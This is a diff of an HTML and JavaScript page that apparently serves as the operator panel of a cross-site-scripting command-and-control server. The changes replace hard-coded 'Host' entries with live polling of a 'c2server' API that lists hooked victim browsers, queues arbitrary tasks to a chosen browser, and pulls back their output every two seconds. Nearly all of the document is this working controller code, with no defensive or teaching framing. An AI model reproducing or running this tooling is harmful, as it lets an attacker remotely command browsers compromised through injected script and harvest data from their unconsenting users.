@@ -1,86 +1,253 @@
 <html>
-    <head>
-        <!-- Latest compiled and minified CSS -->
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
 
-<!-- Optional theme -->
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css" integrity="sha384-fLW2N01lMqjakBkx3l/M9EahuwpSfeNvV63J5ezn3uZzapT0u7EYsXMjQV+0En5r" crossorigin="anonymous">
+<head>
+  <!-- Latest compiled and minified CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7"
+    crossorigin="anonymous">
 
-
-    </head>
-
-  <body>
+  <!-- Optional theme -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css" integrity="sha384-fLW2N01lMqjakBkx3l/M9EahuwpSfeNvV63J5ezn3uZzapT0u7EYsXMjQV+0En5r"
+    crossorigin="anonymous">
 
 
-    <div class="container-fluid">
-      <div class="row">
-        <div class="col-sm-3 col-md-2 sidebar">
-            <h2>Active Browsers</h2>
-          <ul class="nav nav-sidebar nav-pills nav-stacked">
-            <li class="xss-browser active" browser-id="1"><a href="#">Host 1</a></li>
-            <li class="xss-browser" browser-id="2"><a href="#">Host 2</a></li>
-            <li class="xss-browser" browser-id="3"><a href="#">Host 3</a></li>
-            <li class="xss-browser" browser-id="4"><a href="#">Host 4</a></li>
-            <li class="xss-browser" browser-id="5"><a href="#">Host 5</a></li>
-            <li class="xss-browser" browser-id="6"><a href="#">Host 6</a></li>
-            
+</head>
 
-          </ul>
-        </div>
-        <div class="col-md-8 main">
-            <h2>Tasks</h2><button type="button" class="btn btn-default" aria-label="Left Align">
+<body>
+
+
+  <div class="container-fluid">
+    <div class="row">
+      <div class="col-sm-3 col-md-2 sidebar">
+        <h2>Active Browsers</h2>
+        <ul class="nav nav-sidebar nav-pills nav-stacked" id="xss-active-browsers">
+        </ul>
+        <button id="xss-browser-refresh" type="button" class="btn btn-default">
+  <span class="glyphicon glyphicon-refresh" aria-hidden="true"></span>
+</button>
+      </div>
+      <div class="col-md-8 main">
+        <h2>Tasks</h2><button type="button" class="btn btn-default" aria-label="Left Align">
   <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
 </button>
-<strong>1</strong>
-<button type="button" class="btn btn-default" aria-label="Left Align">
+        <span id="taskswitcher-num"><strong>New</strong></span>
+        <button type="button" class="btn btn-default" aria-label="Left Align">
   <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
 </button>
-<button id="xss-submit" type="button" class="btn btn-default" aria-label="Left Align">
+        <button id="xss-submit" type="button" class="btn btn-default" aria-label="Left Align">
   <span class="glyphicon glyphicon-flash" aria-hidden="true"></span>
 </button>
-<div class="panel panel-default">
-  <div class="panel-heading">
-    <h3 class="panel-title">Request</h3>
-  </div>
-  <div class="panel-body">
-    <textarea id="xss-request" class="form-control" rows="8"> </textarea>
-  </div>
-</div>
-<div class="panel panel-default">
-  <div class="panel-heading">
-    <h3 class="panel-title">Response</h3>
-  </div>
-  <div class="panel-body">
-   <textarea id="xss-response" class="form-control" rows="8"> </textarea>
-  </div>
-</div>
-
+        <div class="panel panel-default">
+          <div class="panel-heading">
+            <h3 class="panel-title">Request</h3>
+          </div>
+          <div class="panel-body">
+            <textarea id="xss-request" class="form-control" rows="8"> </textarea>
+          </div>
         </div>
+        <div class="panel panel-default">
+          <div class="panel-heading">
+            <h3 class="panel-title">Response</h3>
+          </div>
+          <div class="panel-body">
+            <textarea id="xss-response" class="form-control" rows="8"> </textarea>
+          </div>
+        </div>
+
       </div>
     </div>
+  </div>
 
-<script src="https://code.jquery.com/jquery-2.2.4.min.js" ></script>
-<!-- Latest compiled and minified JavaScript -->
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
+  <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+  <!-- Latest compiled and minified JavaScript -->
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS"
+    crossorigin="anonymous"></script>
 
- <script>
+  <script>
+    function findByID(arr,idval){//helper function to return array id based on "id" value
+    idval = parseInt(idval);
+  for (i in arr){
+    if (arr[i].id === idval){
+      return i;
+    }
+  }
+  return null;
+}
+    var c2server = location.protocol+'//'+location.host;
+var db = {clients:[]};
+function getdb(callback){
+  var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function () {
+            if (xhttp.readyState == 4 && xhttp.status == 201) {
+                db = JSON.parse(xhttp.responseText);
+                if (typeof callback === "function") {
+                callback();
+                }
+            }
+        };
+        xhttp.open("GET", c2server + "/api/tasks/list", true);
+
+                    xhttp.send(); 
+}
+function getTaskOutput(clientid,taskid,callback){
+      var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function () {
+            if (xhttp.readyState == 4 && xhttp.status == 201) {
+                task = JSON.parse(xhttp.responseText);
+                console.debug("recieved output for task: "+String(taskid)+" output: "+task.output);
+                clientarrid = findByID(db.clients,clientid);
+                taskarrid = findByID(db.clients[clientarrid].tasks,taskid);
+                db.clients[clientarrid].tasks[taskarrid].output = task.output; 
+                               
+                if (typeof callback === "function") {callback();}
+            }
+        };
+        xhttp.open("GET", c2server + "/api/client/"+String(clientid)+"/task/"+String(taskid)+"/output", true);
+
+                    xhttp.send(); 
+}
+function getclients(callback){
+    var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function () {
+            if (xhttp.readyState == 4 && xhttp.status == 201) {
+                clientlist = JSON.parse(xhttp.responseText);
+                for (item in clientlist.clients){
+                  item = parseInt(item);
+
+                  var exists = db.clients.some(function (el) {
+                    return el.id === clientlist.clients[item];
+                  });
+                  if(!exists){
+                    console.debug("client id "+clientlist.clients[item]+" doesn't exist locally, adding...");
+//add item to db
+                    db.clients.push({id:clientlist.clients[item],tasks:[]});
+                    //add item to db
+                  }
+
+
+                }
+                
+                
+                
+                if (typeof callback === "function") {callback();}
+            }
+        };
+        xhttp.open("GET", c2server + "/api/clients/list", true);
+
+                    xhttp.send(); 
+}
+
+function pollTasks(clientid,callback){
+  clientid = parseInt(clientid);
+  //poll /api/client/1/tasks/poll
+      var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function () {
+            if (xhttp.readyState == 4 && xhttp.status == 201) {
+                apitasklist = JSON.parse(xhttp.responseText);
+                for (apitask in apitasklist.tasks){
+                  apitask = parseInt(apitask);
+                  //compare task id's to clientside db
+                  var exists = db.clients[findByID(db.clients,clientid)].tasks.some(function (el) {
+                    return el.id === apitasklist.tasks[apitask].id;
+                  });
+                  //if there is a task that isn't already in the db, add it.
+                  if(!exists){
+                 console.debug("[*] taskid: "+apitasklist.tasks[apitask].id+" does not exist, adding to db"); 
+                 db.clients[findByID(db.clients,clientid)].tasks.push({id:apitasklist.tasks[apitask].id,input:apitasklist.tasks[apitask].input,output:null});
+                }
+                  //compare output true/false from api, to clientside db
+                  clientarrid = findByID(db.clients,clientid);
+                  taskarrid = findByID(db.clients[clientarrid].tasks,apitasklist.tasks[apitask].id);
+                  if(db.clients[clientarrid].tasks[taskarrid].output==null && apitasklist.tasks[apitask].output == true){
+                    console.debug("[*] taskid: "+apitasklist.tasks[apitask].id+" has output that i don't already know! Requesting output data..."); 
+                    //perform a request for task output and add to clientside db, ideally this should just be one request for 1 or more taskids
+                      //probably call a seperate function with callback
+                    getTaskOutput(clientid, apitasklist.tasks[apitask].id,function(){
+                      console.debug("[*] inserted output for taskid: "+apitasklist.tasks[apitask].id); 
+                    });
+                      
+                  }             
+                }
+    //render ui somehow?
+  
+                if (typeof callback === "function") {callback();}
+            }
+        };
+        xhttp.open("GET", c2server + "/api/client/"+String(clientid)+"/tasks/poll", true);
+
+       xhttp.send(); 
+}
+function renderBrowsers(){
+  //backup current active (if any)
+  var tempbrowserid = $("li.xss-browser.active").attr("browser-id");
+  getclients(function() {
+    $('#xss-active-browsers').html('');
+  for (var i in db.clients) {
+  if (tempbrowserid == db.clients[i].id){
+    $('#xss-active-browsers').append('<li class="xss-browser active" browser-id="'+String(db.clients[i].id)+'"><a href="#">Host '+String(db.clients[i].id)+'</a></li>');
+  }
+  else{
+    $('#xss-active-browsers').append('<li class="xss-browser" browser-id="'+String(db.clients[i].id)+'"><a href="#">Host '+String(db.clients[i].id)+'</a></li>');
+  }
+  
+}
+  });
+
+}
+ function refresh() {
+    // make Ajax call here, inside the callback call:
+    setTimeout(refresh, 2000);
+    renderBrowsers();
+    pollTasks($("li.xss-browser.active").attr("browser-id"));
+    // ...
+}
+
+// initial call, or just call refresh directly
+
 
   $(document).ready(function(){
-    $("li.xss-browser").click(function(){ //handle selecting browser to target
+    
+    //get database
+   renderBrowsers();
+    $(document).on('click', 'li.xss-browser', function(){ //handle selecting browser to target
         $("li.xss-browser").removeClass("active");
         $(this).addClass("active");
         console.debug('browser selected: '+$(this).attr("browser-id"));
         
     });
-    $("#xss-submit").click(function(){ 
-        console.debug('submitting to browser: #'+$("li.xss-browser.active").attr("browser-id")+' request: '+$("#xss-request").val());
-        $("#xss-request").val("");
+    $(document).on('click', '#xss-browser-refresh', function(){
+       renderBrowsers();
     });
     
-});   
- </script>
-  </body>
-    
-    
-    
+    $(document).on('click', '#xss-submit',function(){ 
+        var task = {
+    client:$("li.xss-browser.active").attr("browser-id"),
+    input:$("#xss-request").val()
+};
+var json = JSON.stringify(task);
+        console.debug('submitting to browser: '+json);
+                var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function () {
+            if (xhttp.readyState == 4 && xhttp.status == 201) {
+                var jsondata = JSON.parse(xhttp.responseText);
+                taskid = jsondata.taskid;
+                console.debug("[*] registered task id: " + taskid)
+                task.id = taskid;
+                //find array id...
+
+                db.clients[findByID(db.clients,task.client)].tasks.push({id:task.id,input:task.input,output:null});
+            }
+        };
+        xhttp.open("POST", c2server + "/api/client/"+task.client+"/task/add", true);
+                    xhttp.setRequestHeader("Content-type","application/json");
+                    xhttp.send(json); 
+
+                $("#xss-request").val("");
+    });
+    refresh();
+});
+  </script>
+</body>
+
+
+
 </html>
